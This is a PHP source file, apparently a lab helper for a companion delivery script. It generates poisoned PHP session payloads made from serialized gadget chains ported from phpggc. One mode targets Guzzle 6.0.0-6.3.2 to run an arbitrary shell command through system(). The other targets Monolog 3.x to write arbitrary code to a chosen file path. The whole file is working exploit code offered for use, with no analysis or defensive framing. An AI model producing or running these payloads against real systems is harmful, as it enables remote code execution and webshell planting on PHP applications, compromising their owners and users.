<?php
/**
 * Lab-side helper for deliver_update.py: builds poisoned session payloads
 * (base64 of php-session "restore|<serialized gadget>") with PHP's own
 * serializer so private-property mangling matches the target classes exactly.
 *
 * Gadget skeletons ported from phpggc (Apache-2.0, github.com/ambionics/phpggc):
 *   - Guzzle/RCE/1 : guzzlehttp/guzzle 6.0.0-6.3.2 + guzzlehttp/psr7 <1.5.0
 *                    vector __destruct -> FnStream close -> HandlerStack::resolve
 *                    -> $function($parameter)
 *   - Monolog/FW/1 : monolog/monolog 3.x
 *                    vector __destruct -> GroupHandler::close -> BufferHandler
 *                    ::close -> DeduplicationHandler::flush -> file_put_contents
 *                    (line format "<ts>:<level>:<message>")
 *
 * Usage:
 *   php gen_session_payload.php --guzzle-rce "<command>"
 *   php gen_session_payload.php --monolog-fw "<target-path>" "<code>"
 *
 * Prints: base64("restore|" . serialize($gadget))
 */

/* ---- phpggc gadget skeletons (generation-time class definitions) ---- */

namespace Psr\Http\Message {
    interface StreamInterface {}
}

namespace GuzzleHttp\Psr7 {
    class FnStream implements \Psr\Http\Message\StreamInterface
    {
        private $methods;

        public function __construct(array $methods)
        {
            $this->methods = $methods;
            foreach ($methods as $name => $fn) {
                $this->{'_fn_' . $name} = $fn;
            }
        }
    }
}

namespace GuzzleHttp {
    class HandlerStack
    {
        private $handler;
        private $stack;
        private $cached = false;

        public function __construct($function, $parameter)
        {
            $this->stack = array(array($function));
            $this->handler = $parameter;
        }
    }
}

namespace Monolog {
    enum Level: int
    {
        case Debug = 100;
    }

    class LogRecord
    {
        public \Monolog\Level $level = \Monolog\Level::Debug;
        public string $message;
        public \DateTimeImmutable $datetime;

        public function __construct($data)
        {
            $this->message = $data;
            $this->datetime = new \DateTimeImmutable();
        }
    }
}

namespace Monolog\Handler {
    class DeduplicationHandler
    {
        protected string $deduplicationStore;
        protected int $bufferSize = 1;
        protected array $buffer;
        protected \Monolog\Level $deduplicationLevel = \Monolog\Level::Debug;

        public function __construct($data, $path)
        {
            $this->buffer = array(new \Monolog\LogRecord($data));
            $this->deduplicationStore = $path;
        }
    }

    class GroupHandler
    {
        protected array $handlers;

        public function __construct($data, $path)
        {
            $this->handlers = array(new \Monolog\Handler\DeduplicationHandler($data, $path));
        }
    }
}

namespace {
    error_reporting(E_ALL & ~E_DEPRECATED);

    function emit_payload($gadget)
    {
        echo base64_encode("restore|" . serialize($gadget)), "\n";
    }

    if (($argc >= 3) && $argv[1] === '--guzzle-rce') {
        $command = $argv[2];
        $stack = new \GuzzleHttp\HandlerStack('system', $command);
        $stream = new \GuzzleHttp\Psr7\FnStream(array('close' => array($stack, 'resolve')));
        emit_payload($stream);
        exit(0);
    }

    if (($argc >= 4) && $argv[1] === '--monolog-fw') {
        $path = $argv[2];
        $code = $argv[3];
        $gadget = new \Monolog\Handler\GroupHandler($code, $path);
        emit_payload($gadget);
        exit(0);
    }

    fwrite(STDERR, "usage: php gen_session_payload.php --guzzle-rce <command> | --monolog-fw <path> <code>\n");
    exit(2);
}
